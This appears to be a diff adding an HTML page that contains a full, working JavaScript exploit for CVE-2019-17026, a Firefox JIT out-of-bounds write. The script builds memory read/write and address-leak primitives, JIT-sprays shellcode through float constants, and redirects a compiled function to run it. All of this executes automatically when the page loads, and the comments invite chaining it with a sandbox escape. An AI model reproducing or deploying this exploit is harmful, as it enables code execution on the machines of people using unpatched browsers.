@@ -1,0 +1,235 @@
+<html>
+<head>
+</head>
+<body>
+<script>
+
+/*
+Vulnerability: CVE-2019-17026
+Found by: Qihoo 360 in the wild
+
+Exploit by: maxpl0it (@maxpl0it)
+
+No sandbox escape, but feel free to take a crack at it by chaining with CVE-2020-0674 (https://github.com/maxpl0it/CVE-2020-0674-Exploit)
+
+Writeup: https://labs.f-secure.com/blog/exploiting-cve-2019-17026-a-firefox-jit-bug/
+
+*/
+
+// Helpers
+conv = new ArrayBuffer(8);
+dbl = new Float64Array(conv);
+num = new Uint32Array(conv);
+
+
+// Setup
+oob_arr = [1.1, 1.2, , 1.4]; // This is used to trigger the side effect. It's not in the above diagram
+victim = new Array(0x20); // This array will have its length set to zero so it can write over the capacity/length values of setter_arr
+setter_arr = new Array(0x20); // This array will be used to read and set pointers reliably and repeatably in rw_arr
+rw_arr = new Array(0x20); // Used for arbitrary reads and writes
+
+// Side effects
+oob_arr.__defineSetter__("-1", function(x) {
+	console.log("[+] Side Effects reached");
+	victim.length = 0;
+	setter_arr.length = 0;
+	rw_arr.length = 0;
+	gc();
+});
+
+// Call the GC - Phoenhex function
+function gc() {
+	maxMallocBytes=128*1024*1024; // 128m
+	for (var i =0; i <3; i++) {
+		var x = new ArrayBuffer(maxMallocBytes); // Allocate locally, but don't save
+	}
+}
+
+// Exploit
+function jitme(index, in2, in3) {
+	// Removes future bounds checks with GVN
+	victim[in2] = 4.2;
+	victim[in2 - 1] = 4.2;
+
+	// Triggers the side-effect function
+	oob_arr[index] = 2.2;
+
+	// Write out-of-bounds
+	victim[in2] = in3; // capacity and length
+	victim[in2 - 1] = 2.673714696616e-312; // initLength and flags
+}
+
+// JIT the exploit
+for(i=0;i<0x10000;i++) {
+	oob_arr.length = 4; // Reset the length so that StoreElementHole node is used
+	jitme(5, 11, 2.67371469724e-312);
+}
+
+oob_arr.length = 4; // Reset the length one more time
+jitme(-1, 11, 2.67371469724e-312); // Call the jitted function with the side-effect index (-1)
+
+
+
+// Create properties that we can use for weak reads
+rw_arr.x = 5.40900888e-315; // Most significant bits are 0 - no tag, allows an offset of 4 to be treated as a double
+rw_arr.y = 0x41414141;
+rw_arr.z = 0; // Least significant bits are 0 - offset of 4 means that y will be treated as a double
+
+
+
+// Can only handle normal pointers, not tagged pointers
+//    1. Backup property pointer
+//    2. Set property pointer to target address
+//    3. Read value at address with property x
+//    4. Restore the original property pointer
+function weak_read(dbl_addr) {
+	original = setter_arr[8];
+	setter_arr[8] = dbl_addr; // properties pointer - change the pointer of x
+	result = rw_arr.x;
+	setter_arr[8] = original;
+	return result;
+}
+
+
+
+// Can only handle normal pointers, not tagged pointers
+//    1. Backup property pointer
+//    2. Set property pointer to target address
+//    3. Set value at address with property x
+//    4. Restore the original property pointer
+function weak_write(dbl_addr, dbl_val) {
+	original = setter_arr[8];
+	setter_arr[8] = dbl_addr;
+	rw_arr.x = dbl_val;
+	setter_arr[8] = original;
+}
+
+
+
+// Erases the tag and reads the address as a double
+//    1. Backup property pointer
+//    2. Sets property y to the object
+//    3. Calculate new property offset
+//    4. Read lower bits as double
+//    5. Read upper bits as double
+//    6. Remove the tag
+//    7. Restore the original property pointer
+function weak_addrof(o) {
+	original = setter_arr[8]; // 1
+	rw_arr.y = o; // 2
+
+	// 3
+	dbl[0] = setter_arr[8];
+	num[0] = num[0] + 4;
+	setter_arr[8] = dbl[0];
+
+	// 4
+	dbl[0] = rw_arr.x;
+	lower = num[1];
+
+	// 5
+	dbl[0] = rw_arr.y; // Works in release, not in debug (assertion issues)
+
+	// 6
+	upper = num[0] & 0x00007fff;
+
+	// 7
+	setter_arr[8] = original;
+
+	// Convert to a float and return
+	num[0] = lower;
+	num[1] = upper;
+	return dbl[0];
+}
+
+
+// Use constants to JIT spray shellcode
+function shellcode(){
+	find_me = 5.40900888e-315; // 0x41414141 in memory
+	A = -6.828527034422786e-229;
+	B = 8.568532312320605e+170;
+	C = 1.4813365150669252e+248;
+	D = -6.032447120847604e-264;
+	E = -6.0391189260385385e-264;
+	F = 1.0842822352493598e-25;
+	G = 9.241363425014362e+44;
+	H = 2.2104256869204514e+40;
+	I = 2.4929675059396527e+40;
+	J = 3.2459699498717e-310;
+	K = 1.637926e-318;
+}
+
+target_buf = new Float64Array(1); // Used for the strong read
+data_ptr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read
+
+
+// Saves the pointer to the data pointer so it doesn't have to be recalculated
+function setup_strong_read() {
+	arr_addr = weak_addrof(target_buf);
+	dbl[0] = arr_addr;
+	num[0] = num[0] + 56; // float64array data pointer
+	data_ptr = dbl[0];
+}
+
+// The strong read
+//    1. Write the target address to the data pointer
+//    2. Read the first double from the location
+function read(dbl_addr) {
+	weak_write(data_ptr, dbl_addr);
+	return target_buf[0];
+}
+
+
+// Searches from the JIT location to find 0x41414141
+function find_shellcode_addr(addr) {
+	dbl[0] = addr;
+	for(i=0;i<100;i++) { // Only search 100 qwords
+		val = read(dbl[0]); // Strong read primitive
+		if(val == 5.40900888e-315) {
+			console.log("[+] Shellcode offset at 0x" + num[1].toString(16) + num[0].toString(16));
+			num[0] = num[0] + 8; // Past the find_me value
+			return dbl[0];
+		}
+		num[0] = num[0] + 8;
+	}
+}
+
+
+// Runs the exploit
+function exploit() {
+	// Compile shellcode
+	for(i=0;i<0x1000;i++) shellcode();
+
+	// Get Shellcode address
+	shellcode_func = weak_addrof(shellcode);
+
+	// Get JSJitInfo structure
+	dbl[0] = shellcode_func;
+	num[0] = num[0] + 0x30; // JSFunction.u.native.extra.jitInfo_
+	jitinfo = weak_read(dbl[0]);
+
+	// Get JIT compiled location
+	jit_addr = weak_read(jitinfo);
+	dbl[0] = jit_addr;
+	if(num[0] == 0x41414141) {
+		window.location.reload();
+	}
+	console.log("[+] JIT is at 0x" + num[1].toString(16) + num[0].toString(16));
+
+	// Get strong read primitive
+	setup_strong_read();
+
+	// For this we need the strong read primitive since values here can start with 0xffff and thus act as tags
+	shellcode_addr = find_shellcode_addr(jit_addr);
+
+	// Write the new JIT function address
+	weak_write(jitinfo, shellcode_addr);
+
+	// Trigger code exec
+	shellcode();
+}
+
+exploit()
+</script>
+</body>
+</html>
